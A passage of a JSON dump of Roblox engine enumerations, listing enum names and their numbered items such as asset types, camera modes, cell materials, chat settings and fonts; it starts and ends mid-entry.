"Enum":"ActionType"},{"type":"Enum","Name":"ActuatorRelativeTo","tags":[]},{"type":"EnumItem","Name":"Attachment0","tags":[],"Value":0,"Enum":"ActuatorRelativeTo"},{"type":"EnumItem","Name":"Attachment1","tags":[],"Value":1,"Enum":"ActuatorRelativeTo"},{"type":"EnumItem","Name":"World","tags":[],"Value":2,"Enum":"ActuatorRelativeTo"},{"type":"Enum","Name":"ActuatorType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":1,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Servo","tags":[],"Value":2,"Enum":"ActuatorType"},{"type":"Enum","Name":"AnimationPriority","tags":[]},{"type":"EnumItem","Name":"Idle","tags":[],"Value":0,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Action","tags":[],"Value":2,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Core","tags":[],"Value":1000,"Enum":"AnimationPriority"},{"type":"Enum","Name":"Antialiasing","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"Antialiasing"},{"type":"Enum","Name":"AspectType","tags":[]},{"type":"EnumItem","Name":"FitWithinMaxSize","tags":[],"Value":0,"Enum":"AspectType"},{"type":"EnumItem","Name":"ScaleWithParentSize","tags":[],"Value":1,"Enum":"AspectType"},{"type":"Enum","Name":"AssetType","tags":[]},{"type":"EnumItem","Name":"Image","tags":[],"Value":1,"Enum":"AssetType"},{"type":"EnumItem","Name":"TeeShirt","tags":[],"Value":2,"Enum":"AssetType"},{"type":"EnumItem","Name":"Audio","tags":[],"Value":3,"Enum":"AssetType"},{"type":"EnumItem","Name":"Mesh","tags":[],"Value":4,"Enum":"AssetType"},{"type":"EnumItem","Name":"Lua","tags":[],"Value":5,"Enum":"AssetType"},{"type":"EnumItem","Name":"Hat","tags":[],"Value":8,"Enum":"AssetType"},{"type":"EnumItem","Name":"Place","tags":[],"Value":9,"Enum":"AssetType"},{"type":"EnumItem","Name":"Model","tags":[],"Value":10,"Enum":"AssetType"},{"type":"EnumItem","Name":"Shirt","tags":[],"Value":11,"Enum":"AssetType"},{"type":"EnumItem","Name":"Pants","tags":[],"Value":12,"Enum":"AssetType"},{"type":"EnumItem","Name":"Decal","tags":[],"Value":13,"Enum":"AssetType"},{"type":"EnumItem","Name":"Head","tags":[],"Value":17,"Enum":"AssetType"},{"type":"EnumItem","Name":"Face","tags":[],"Value":18,"Enum":"AssetType"},{"type":"EnumItem","Name":"Gear","tags":[],"Value":19,"Enum":"AssetType"},{"type":"EnumItem","Name":"Badge","tags":[],"Value":21,"Enum":"AssetType"},{"type":"EnumItem","Name":"Animation","tags":[],"Value":24,"Enum":"AssetType"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":27,"Enum":"AssetType"},{"type":"EnumItem","Name":"RightArm","tags":[],"Value":28,"Enum":"AssetType"},{"type":"EnumItem","Name":"LeftArm","tags":[],"Value":29,"Enum":"AssetType"},{"type":"EnumItem","Name":"LeftLeg","tags":[],"Value":30,"Enum":"AssetType"},{"type":"EnumItem","Name":"RightLeg","tags":[],"Value":31,"Enum":"AssetType"},{"type":"EnumItem","Name":"Package","tags":[],"Value":32,"Enum":"AssetType"},{"type":"EnumItem","Name":"GamePass","tags":[],"Value":34,"Enum":"AssetType"},{"type":"EnumItem","Name":"Plugin","tags":[],"Value":38,"Enum":"AssetType"},{"type":"EnumItem","Name":"MeshPart","tags":[],"Value":40,"Enum":"AssetType"},{"type":"EnumItem","Name":"HairAccessory","tags":[],"Value":41,"Enum":"AssetType"},{"type":"EnumItem","Name":"FaceAccessory","tags":[],"Value":42,"Enum":"AssetType"},{"type":"EnumItem","Name":"NeckAccessory","tags":[],"Value":43,"Enum":"AssetType"},{"type":"EnumItem","Name":"ShoulderAccessory","tags":[],"Value":44,"Enum":"AssetType"},{"type":"EnumItem","Name":"FrontAccessory","tags":[],"Value":45,"Enum":"AssetType"},{"type":"EnumItem","Name":"BackAccessory","tags":[],"Value":46,"Enum":"AssetType"},{"type":"EnumItem","Name":"WaistAccessory","tags":[],"Value":47,"Enum":"AssetType"},{"type":"EnumItem","Name":"ClimbAnimation","tags":[],"Value":48,"Enum":"AssetType"},{"type":"EnumItem","Name":"DeathAnimation","tags":[],"Value":49,"Enum":"AssetType"},{"type":"EnumItem","Name":"FallAnimation","tags":[],"Value":50,"Enum":"AssetType"},{"type":"EnumItem","Name":"IdleAnimation","tags":[],"Value":51,"Enum":"AssetType"},{"type":"EnumItem","Name":"JumpAnimation","tags":[],"Value":52,"Enum":"AssetType"},{"type":"EnumItem","Name":"RunAnimation","tags":[],"Value":53,"Enum":"AssetType"},{"type":"EnumItem","Name":"SwimAnimation","tags":[],"Value":54,"Enum":"AssetType"},{"type":"EnumItem","Name":"WalkAnimation","tags":[],"Value":55,"Enum":"AssetType"},{"type":"EnumItem","Name":"PoseAnimation","tags":[],"Value":56,"Enum":"AssetType"},{"type":"EnumItem","Name":"EarAccessory","tags":[],"Value":57,"Enum":"AssetType"},{"type":"EnumItem","Name":"EyeAccessory","tags":[],"Value":58,"Enum":"AssetType"},{"type":"Enum","Name":"Axis","tags":[]},{"type":"EnumItem","Name":"X","tags":[],"Value":0,"Enum":"Axis"},{"type":"EnumItem","Name":"Y","tags":[],"Value":1,"Enum":"Axis"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"Axis"},{"type":"Enum","Name":"BinType","tags":[]},{"type":"EnumItem","Name":"Script","tags":[],"Value":0,"Enum":"BinType"},{"type":"EnumItem","Name":"GameTool","tags":[],"Value":1,"Enum":"BinType"},{"type":"EnumItem","Name":"Grab","tags":[],"Value":2,"Enum":"BinType"},{"type":"EnumItem","Name":"Clone","tags":[],"Value":3,"Enum":"BinType"},{"type":"EnumItem","Name":"Hammer","tags":[],"Value":4,"Enum":"BinType"},{"type":"Enum","Name":"BodyPart","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"BodyPart"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftArm","tags":[],"Value":2,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightArm","tags":[],"Value":3,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftLeg","tags":[],"Value":4,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightLeg","tags":[],"Value":5,"Enum":"BodyPart"},{"type":"Enum","Name":"Button","tags":[]},{"type":"EnumItem","Name":"Jump","tags":[],"Value":32,"Enum":"Button"},{"type":"EnumItem","Name":"Dismount","tags":[],"Value":8,"Enum":"Button"},{"type":"Enum","Name":"ButtonStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButtonDefault","tags":[],"Value":1,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButton","tags":[],"Value":2,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundButton","tags":[],"Value":3,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDefaultButton","tags":[],"Value":4,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDropdownButton","tags":[],"Value":5,"Enum":"ButtonStyle"},{"type":"Enum","Name":"CameraMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraMode"},{"type":"EnumItem","Name":"LockFirstPerson","tags":[],"Value":1,"Enum":"CameraMode"},{"type":"Enum","Name":"CameraPanMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraPanMode"},{"type":"EnumItem","Name":"EdgeBump","tags":[],"Value":1,"Enum":"CameraPanMode"},{"type":"Enum","Name":"CameraType","tags":[]},{"type":"EnumItem","Name":"Fixed","tags":[],"Value":0,"Enum":"CameraType"},{"type":"EnumItem","Name":"Watch","tags":[],"Value":2,"Enum":"CameraType"},{"type":"EnumItem","Name":"Attach","tags":[],"Value":1,"Enum":"CameraType"},{"type":"EnumItem","Name":"Track","tags":[],"Value":3,"Enum":"CameraType"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":4,"Enum":"CameraType"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":5,"Enum":"CameraType"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":6,"Enum":"CameraType"},{"type":"EnumItem","Name":"Orbital","tags":[],"Value":7,"Enum":"CameraType"},{"type":"Enum","Name":"CellBlock","tags":[]},{"type":"EnumItem","Name":"Solid","tags":[],"Value":0,"Enum":"CellBlock"},{"type":"EnumItem","Name":"VerticalWedge","tags":[],"Value":1,"Enum":"CellBlock"},{"type":"EnumItem","Name":"CornerWedge","tags":[],"Value":2,"Enum":"CellBlock"},{"type":"EnumItem","Name":"InverseCornerWedge","tags":[],"Value":3,"Enum":"CellBlock"},{"type":"EnumItem","Name":"HorizontalWedge","tags":[],"Value":4,"Enum":"CellBlock"},{"type":"Enum","Name":"CellMaterial","tags":[]},{"type":"EnumItem","Name":"Empty","tags":[],"Value":0,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":2,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":3,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":4,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Asphalt","tags":[],"Value":5,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Iron","tags":[],"Value":6,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Aluminum","tags":[],"Value":7,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gold","tags":[],"Value":8,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodPlank","tags":[],"Value":9,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodLog","tags":[],"Value":10,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gravel","tags":[],"Value":11,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"CinderBlock","tags":[],"Value":12,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"MossyStone","tags":[],"Value":13,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Cement","tags":[],"Value":14,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"RedPlastic","tags":[],"Value":15,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"BluePlastic","tags":[],"Value":16,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Water","tags":[],"Value":17,"Enum":"CellMaterial"},{"type":"Enum","Name":"CellOrientation","tags":[]},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":0,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"NegX","tags":[],"Value":3,"Enum":"CellOrientation"},{"type":"Enum","Name":"CenterDialogType","tags":[]},{"type":"EnumItem","Name":"UnsolicitedDialog","tags":[],"Value":1,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"PlayerInitiatedDialog","tags":[],"Value":2,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"ModalDialog","tags":[],"Value":3,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"QuitDialog","tags":[],"Value":4,"Enum":"CenterDialogType"},{"type":"Enum","Name":"ChatColor","tags":[]},{"type":"EnumItem","Name":"Blue","tags":[],"Value":0,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Green","tags":[],"Value":1,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Red","tags":[],"Value":2,"Enum":"ChatColor"},{"type":"EnumItem","Name":"White","tags":[],"Value":3,"Enum":"ChatColor"},{"type":"Enum","Name":"ChatMode","tags":[]},{"type":"EnumItem","Name":"Menu","tags":[],"Value":0,"Enum":"ChatMode"},{"type":"EnumItem","Name":"TextAndMenu","tags":[],"Value":1,"Enum":"ChatMode"},{"type":"Enum","Name":"ChatPrivacyMode","tags":[]},{"type":"EnumItem","Name":"AllUsers","tags":[],"Value":0,"Enum":"ChatPrivacyMode"},{"type":"EnumItem","Name":"NoOne","tags":[],"Value":1,"Enum":"ChatPrivacyMode"},{"type":"EnumItem","Name":"Friends","tags":[],"Value":2,"Enum":"ChatPrivacyMode"},{"type":"Enum","Name":"ChatStyle","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"Bubble","tags":[],"Value":1,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"ClassicAndBubble","tags":[],"Value":2,"Enum":"ChatStyle"},{"type":"Enum","Name":"CollisionFidelity","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Hull","tags":[],"Value":1,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Box","tags":[],"Value":2,"Enum":"CollisionFidelity"},{"type":"Enum","Name":"ComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Orbital","tags":[],"Value":3,"Enum":"ComputerCameraMovementMode"},{"type":"Enum","Name":"ComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"ComputerMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"ComputerMovementMode"},{"type":"Enum","Name":"ConcurrencyModel","tags":[]},{"type":"EnumItem","Name":"Serial","tags":[],"Value":0,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Safe","tags":[],"Value":1,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Logical","tags":[],"Value":2,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Empirical","tags":[],"Value":3,"Enum":"ConcurrencyModel"},{"type":"Enum","Name":"ConnectionState","tags":[]},{"type":"EnumItem","Name":"Connected","tags":[],"Value":0,"Enum":"ConnectionState"},{"type":"EnumItem","Name":"Disconnected","tags":[],"Value":1,"Enum":"ConnectionState"},{"type":"Enum","Name":"ContextActionPriority","tags":[]},{"type":"EnumItem","Name":"Low","tags":[],"Value":1000,"Enum":"ContextActionPriority"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":2000,"Enum":"ContextActionPriority"},{"type":"EnumItem","Name":"Default","tags":[],"Value":2000,"Enum":"ContextActionPriority"},{"type":"EnumItem","Name":"High","tags":[],"Value":3000,"Enum":"ContextActionPriority"},{"type":"Enum","Name":"ContextActionResult","tags":[]},{"type":"EnumItem","Name":"Pass","tags":[],"Value":1,"Enum":"ContextActionResult"},{"type":"EnumItem","Name":"Sink","tags":[],"Value":0,"Enum":"ContextActionResult"},{"type":"Enum","Name":"ControlMode","tags":[]},{"type":"EnumItem","Name":"MouseLockSwitch","tags":[],"Value":1,"Enum":"ControlMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ControlMode"},{"type":"Enum","Name":"CoreGuiType","tags":[]},{"type":"EnumItem","Name":"PlayerList","tags":[],"Value":0,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Health","tags":[],"Value":1,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Backpack","tags":[],"Value":2,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Chat","tags":[],"Value":3,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"All","tags":[],"Value":4,"Enum":"CoreGuiType"},{"type":"Enum","Name":"CreatorType","tags":[]},{"type":"EnumItem","Name":"User","tags":[],"Value":0,"Enum":"CreatorType"},{"type":"EnumItem","Name":"Group","tags":[],"Value":1,"Enum":"CreatorType"},{"type":"Enum","Name":"CurrencyType","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Robux","tags":[],"Value":1,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Tix","tags":[],"Value":2,"Enum":"CurrencyType"},{"type":"Enum","Name":"CustomCameraMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"CustomCameraMode"},{"type":"Enum","Name":"DataStoreRequestType","tags":[]},{"type":"EnumItem","Name":"GetAsync","tags":[],"Value":0,"Enum":"DataStoreRequestType"},{"type":"EnumItem","Name":"SetIncrementAsync","tags":[],"Value":1,"Enum":"DataStoreRequestType"},{"type":"EnumItem","Name":"UpdateAsync","tags":[],"Value":2,"Enum":"DataStoreRequestType"},{"type":"EnumItem","Name":"GetSortedAsync","tags":[],"Value":3,"Enum":"DataStoreRequestType"},{"type":"EnumItem","Name":"SetIncrementSortedAsync","tags":[],"Value":4,"Enum":"DataStoreRequestType"},{"type":"EnumItem","Name":"OnUpdate","tags":[],"Value":5,"Enum":"DataStoreRequestType"},{"type":"Enum","Name":"DevCameraOcclusionMode","tags":[]},{"type":"EnumItem","Name":"Zoom","tags":[],"Value":0,"Enum":"DevCameraOcclusionMode"},{"type":"EnumItem","Name":"Invisicam","tags":[],"Value":1,"Enum":"DevCameraOcclusionMode"},{"type":"Enum","Name":"DevComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Orbital","tags":[],"Value":3,"Enum":"DevComputerCameraMovementMode"},{"type":"Enum","Name":"DevComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":3,"Enum":"DevComputerMovementMode"},{"type":"Enum","Name":"DevTouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Orbital","tags":[],"Value":3,"Enum":"DevTouchCameraMovementMode"},{"type":"Enum","Name":"DevTouchMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":5,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"DynamicThumbstick","tags":[],"Value":6,"Enum":"DevTouchMovementMode"},{"type":"Enum","Name":"DeveloperMemoryTag","tags":[]},{"type":"EnumItem","Name":"Internal","tags":[],"Value":0,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"HttpCache","tags":[],"Value":1,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"Instances","tags":[],"Value":2,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"Signals","tags":[],"Value":3,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"LuaHeap","tags":[],"Value":4,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"Script","tags":[],"Value":5,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"PhysicsCollision","tags":[],"Value":6,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"PhysicsParts","tags":[],"Value":7,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"GraphicsSolidModels","tags":[],"Value":8,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"GraphicsMeshParts","tags":[],"Value":9,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"GraphicsParticles","tags":[],"Value":10,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"GraphicsParts","tags":[],"Value":11,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"GraphicsSpatialHash","tags":[],"Value":12,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"GraphicsTerrain","tags":[],"Value":13,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"GraphicsTexture","tags":[],"Value":14,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"GraphicsTextureCharacter","tags":[],"Value":15,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"Sounds","tags":[],"Value":16,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"StreamingSounds","tags":[],"Value":17,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"TerrainVoxels","tags":[],"Value":18,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"Gui","tags":[],"Value":20,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"Animation","tags":[],"Value":21,"Enum":"DeveloperMemoryTag"},{"type":"EnumItem","Name":"Navigation","tags":[],"Value":22,"Enum":"DeveloperMemoryTag"},{"type":"Enum","Name":"DialogBehaviorType","tags":[]},{"type":"EnumItem","Name":"SinglePlayer","tags":[],"Value":0,"Enum":"DialogBehaviorType"},{"type":"EnumItem","Name":"MultiplePlayers","tags":[],"Value":1,"Enum":"DialogBehaviorType"},{"type":"Enum","Name":"DialogPurpose","tags":[]},{"type":"EnumItem","Name":"Quest","tags":[],"Value":0,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Help","tags":[],"Value":1,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Shop","tags":[],"Value":2,"Enum":"DialogPurpose"},{"type":"Enum","Name":"DialogTone","tags":[]},{"type":"EnumItem","Name":"Neutral","tags":[],"Value":0,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Friendly","tags":[],"Value":1,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Enemy","tags":[],"Value":2,"Enum":"DialogTone"},{"type":"Enum","Name":"DominantAxis","tags":[]},{"type":"EnumItem","Name":"Width","tags":[],"Value":0,"Enum":"DominantAxis"},{"type":"EnumItem","Name":"Height","tags":[],"Value":1,"Enum":"DominantAxis"},{"type":"Enum","Name":"EasingDirection","tags":[]},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"EasingDirection"},{"type":"Enum","Name":"EasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Sine","tags":[],"Value":1,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quad","tags":[],"Value":3,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quart","tags":[],"Value":4,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quint","tags":[],"Value":5,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":6,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":7,"Enum":"EasingStyle"},{"type":"Enum","Name":"EnviromentalPhysicsThrottle","tags":[]},{"type":"EnumItem","Name":"DefaultAuto","tags":[],"Value":0,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Disabled","tags":[],"Value":1,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip2","tags":[],"Value":3,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip4","tags":[],"Value":4,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip8","tags":[],"Value":5,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip16","tags":[],"Value":6,"Enum":"EnviromentalPhysicsThrottle"},{"type":"Enum","Name":"ErrorReporting","tags":[]},{"type":"EnumItem","Name":"DontReport","tags":[],"Value":0,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Prompt","tags":[],"Value":1,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Report","tags":[],"Value":2,"Enum":"ErrorReporting"},{"type":"Enum","Name":"ExplosionType","tags":[]},{"type":"EnumItem","Name":"NoCraters","tags":[],"Value":0,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"Craters","tags":[],"Value":1,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"CratersAndDebris","tags":[],"Value":2,"Enum":"ExplosionType"},{"type":"Enum","Name":"FillDirection","tags":[]},{"type":"EnumItem","Name":"Horizontal","tags":[],"Value":0,"Enum":"FillDirection"},{"type":"EnumItem","Name":"Vertical","tags":[],"Value":1,"Enum":"FillDirection"},{"type":"Enum","Name":"FilterResult","tags":[]},{"type":"EnumItem","Name":"Rejected","tags":[],"Value":1,"Enum":"FilterResult"},{"type":"EnumItem","Name":"Accepted","tags":[],"Value":0,"Enum":"FilterResult"},{"type":"Enum","Name":"Font","tags":[]},{"type":"EnumItem","Name":"Legacy","tags":[],"Value":0,"Enum":"Font"},{"type":"EnumItem","Name":"Arial","tags":[],"Value":1,"Enum":"Font"},{"type":"EnumItem","Name":"ArialBold","tags":[],"Value":2,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSans","tags":[],"Value":3,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansBold","tags":[],"Value":4,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansSemibold","tags":[],"Value":16,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansLight","tags":[],"Value":5,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansItalic","tags":[],"Value":6,"Enum":"Font"},{"type":"EnumItem","Name":"Bodoni","tags":[],"Value":7,"Enum":"Font"},{"type":"EnumItem","Name":"Garamond","tags":[],"Value":8,"Enum":"Font"},{"type":"EnumItem","Name":"Cartoon","tags":[],"Value":9,"Enum":"Font"},{"type":"EnumItem","Name":"Code","tags":[],"Value":10,"Enum":"Font"},{"type":"EnumItem","Name":"Highway","tags":[],"Value":11,"Enum":"Font"},{"type":"EnumItem","Name":"SciFi","tags":[],"Value":12,"Enum":"Font"},{"type":"EnumItem","Name":"Arcade","tags":[],"Value":13,"Enum":"Font"},{"type":"EnumItem","Name":"Fantasy","tags":[],"Value":14,"Enum":"Font"},{"type":"EnumItem","Name":"Antique","tags":[],"Value":15,"Enum":"Font"},{"type":"Enum","Name":"FontSize","tags":[]},{"type":"EnumItem","Name":"Size8","tags":[],"Value":0,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size9","tags":[],"Value":1,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size10","tags":[],"Value":2,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size11","tags":[],"Value":3,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size12","tags":[],"Value":4,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size14","tags":[],"Value":5,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size18","tags":[],"Value":6,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size24","tags":[],"Value":7,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size36","tags":[],"Value":8,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size48","tags":[],"Value":9,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size28","tags":[],"Value":10,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size32","tags":[],"Value":11,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size42","tags":[],"Value":12,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size60","tags":[],"Value":13,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size96","tags":[],"Value":14,"Enum":"FontSize"},{"type":"Enum","Name":"FormFactor","tags":[]},{"type":"EnumItem","Name":"Symmetric","tags":[],"Value":0,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":1,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Plate","tags":[],"Va